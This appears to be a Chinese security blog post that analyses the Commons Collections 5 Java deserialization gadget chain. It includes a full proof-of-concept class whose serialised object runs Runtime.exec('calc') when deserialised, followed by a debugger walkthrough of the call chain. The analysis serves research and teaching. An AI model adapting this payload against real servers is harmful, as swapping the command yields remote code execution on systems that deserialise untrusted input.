> 原文链接: https://www.anquanke.com//post/id/220697 


# Java安全之Commons Collections5分析


                                阅读量   
                                **126360**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t014ac313fdc963af46.jpg)](https://p2.ssl.qhimg.com/t014ac313fdc963af46.jpg)



## 0x00 前言

在后面的几条CC链中，如果和前面的链构造都是基本一样的话，就不细讲了，参考一下前面的几篇文。

在CC5链中ysoserial给出的提示是需要JDK1.8并且`SecurityManager`需要是关闭的。先来介绍一下`SecurityManager`是干嘛的。`SecurityManager`也就是java的安全管理器，当运行未知的Java程序的时候，该程序可能有恶意代码（删除系统文件、重启系统等），为了防止运行恶意代码对系统产生影响，需要对运行的代码的权限进行控制，这时候就要启用Java安全管理器。该管理器默认是关闭的。



## 0x01 POC分析

```
package com.test;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;

public class cc5 `{`
    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException `{`
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] `{`
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] `{`
                        String.class, Class[].class `}`, new Object[] `{`
                        "getRuntime", new Class[0] `}`),
                new InvokerTransformer("invoke", new Class[] `{`
                        Object.class, Object[].class `}`, new Object[] `{`
                        null, new Object[0] `}`),
                new InvokerTransformer("exec",
                        new Class[] `{` String.class `}`, new Object[]`{`"calc"`}`)`}`);
        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);
        TiedMapEntry tiedmap = new TiedMapEntry(map,123);
        BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(poc,tiedmap);

        try`{`
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc5"));
            outputStream.writeObject(poc);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc5"));
            inputStream.readObject();
        `}`catch(Exception e)`{`
            e.printStackTrace();
        `}`
    `}`
`}`
```

前面的上半段和CC1链是一模一样的，主要来分析在这两者中不同的部分。

```
HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);
        TiedMapEntry tiedmap = new TiedMapEntry(map,123);
        BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(poc,tiedmap);
```

前面的new了一个`HashMap`传入到`LazyMap`里面，同时也传入了`ChainedTransformer`实例化对象，当调用get方法的时候，就会调用到`ChainedTransformer`的`transform`f方法，这个没啥好说的，老面孔了。前面也分析过好几回了。主要的是下面的这一段代码。

```
TiedMapEntry tiedmap = new TiedMapEntry(map,123);
        BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(poc,tiedmap);
```

`TiedMapEntry`是一个新生面孔，来查看一下该类源码。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t019544d1c6aa8e1ef1.png)

该类的构造方法需要2个参数。所以我们的POC代码中，传入了一个`LazyMap`实例化对象和一个`123`的字符做占位。

[![](https://p2.ssl.qhimg.com/t0162974b641ed252f8.png)](https://p2.ssl.qhimg.com/t0162974b641ed252f8.png)

而在`getValue`方法里面就会去调用到刚刚赋值的map类get方法。前面我们传入的是`LazyMap`对象，这时候调用get方法的话，就和前面的串联起来达成命令执行了。这里先不做分析，来到下一步，查看一下，哪个地方会调用到该方法。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t015bb0c12fe7c2058e.png)

而在`toString`方法里面就会去调用到`getValue`方法。

```
BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(poc,tiedmap);
```

再来看下面一段代码，new了一个`BadAttributeValueExpException`的对象，并且反射获取`val`的值，将`val`的值设置为`TiedMapEntry`实例化对象。

[![](https://p4.ssl.qhimg.com/t016c94bf8052ebf9ef.png)](https://p4.ssl.qhimg.com/t016c94bf8052ebf9ef.png)

在`BadAttributeValueExpException`的`readObject`方法会获取到`val`的值，然后赋值给`valObj`变量,然后调用`valObj`的`toString`方法。



## 0x02 CC5链调试

在`readObject`复写点打个断点，也就是`BadAttributeValueExpException`的`readObject`方法。

[![](https://p5.ssl.qhimg.com/t012a895e7cb0d9d588.png)](https://p5.ssl.qhimg.com/t012a895e7cb0d9d588.png)

上面断点的地方会去获取`val`的值，赋值给`valObj`，前面我们使用反射将`val`设置为`TiedMapEntry`的对象。

这里会去调用`valObj`的`toString`方法,也就是`TiedMapEntry`的`toString`方法。跟进一下该方法，查看调用。

[![](https://p5.ssl.qhimg.com/t015833dd899fd887e9.png)](https://p5.ssl.qhimg.com/t015833dd899fd887e9.png)

这里面会去调用`getKey`和`getValue`方法，这里选择跟踪`getValue`方法。

[![](https://p0.ssl.qhimg.com/t017e1d5724c3b0b0a6.png)](https://p0.ssl.qhimg.com/t017e1d5724c3b0b0a6.png)

这里的`this.map`为`LazyMap`实例化对象，是在创建`TiedMapEntry`对象的时候传参进去的。再跟进一下get方法就和前面调试CC1链的步骤一样了。

[![](https://p2.ssl.qhimg.com/t0143109a03e2badb35.png)](https://p2.ssl.qhimg.com/t0143109a03e2badb35.png)

这里会去调用`this.factory`的`transform`,也就是`ChainedTransformer`的`transform`。再来跟进一下。

[![](https://p1.ssl.qhimg.com/t01335404528e45e866.png)](https://p1.ssl.qhimg.com/t01335404528e45e866.png)

接着就是遍历调用数组里面的`transform`方法。第一个值为`ConstantTransformer`，会直接返回传参的值。

[![](https://p1.ssl.qhimg.com/t01751e6e8d6c7eeb43.png)](https://p1.ssl.qhimg.com/t01751e6e8d6c7eeb43.png)

这里返回的是`Runtime`，将该值传入第二次的参数里面调用`transform`方法。

[![](https://p2.ssl.qhimg.com/t0149ce559baa654199.png)](https://p2.ssl.qhimg.com/t0149ce559baa654199.png)

[![](https://p3.ssl.qhimg.com/t01d4ec072e77360e12.png)](https://p3.ssl.qhimg.com/t01d4ec072e77360e12.png)

第二次遍历的值是`InvokerTransformer`对象， 这里的`transform`方法会反射去获取方法并且进行执行。第二次执行返回的是`Runtime.getRuntime`的实例化对象。再传入到第三次执行的参数里面去执行。

[![](https://p5.ssl.qhimg.com/t015c79bcf165b65300.png)](https://p5.ssl.qhimg.com/t015c79bcf165b65300.png)

第三次去执行则是获取返回他的`invoke`方法,传入给第四次执行的参数里面。

[![](https://p2.ssl.qhimg.com/t01aadceec14dbe5f28.png)](https://p2.ssl.qhimg.com/t01aadceec14dbe5f28.png)

第四次执行里面的`this.iMethodName`为`exec`,`this.iArgs`为`calc`。执行完成这一步过后就会去执行我们设置好的命令，也就是calc。弹出计算器。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t012291f657dcf53ae4.png)

### <a class="reference-link" name="%E8%B0%83%E7%94%A8%E9%93%BE"></a>调用链

```
BadAttributeValueExpException.readObject-&gt;TiedMapEntry.toString
-&gt;LazyMap.get-&gt;ChainedTransformer.transform
-&gt;ConstantTransformer.transform-&gt;InvokerTransformer.transform
-&gt;Method.invoke-&gt;Class.getMethod
-&gt;InvokerTransformer.transform-&gt;Method.invoke
-&gt;Runtime.getRuntime-&gt; InvokerTransformer.transform
-&gt;Method.invoke-&gt;Runtime.exec
```



## 0x03 结尾

其实在该链的后面中，并没有写太详细，因为后面和CC1链中的都是一模一样的。如果没有去调试过的话，建议先去调试一下CC1的链。
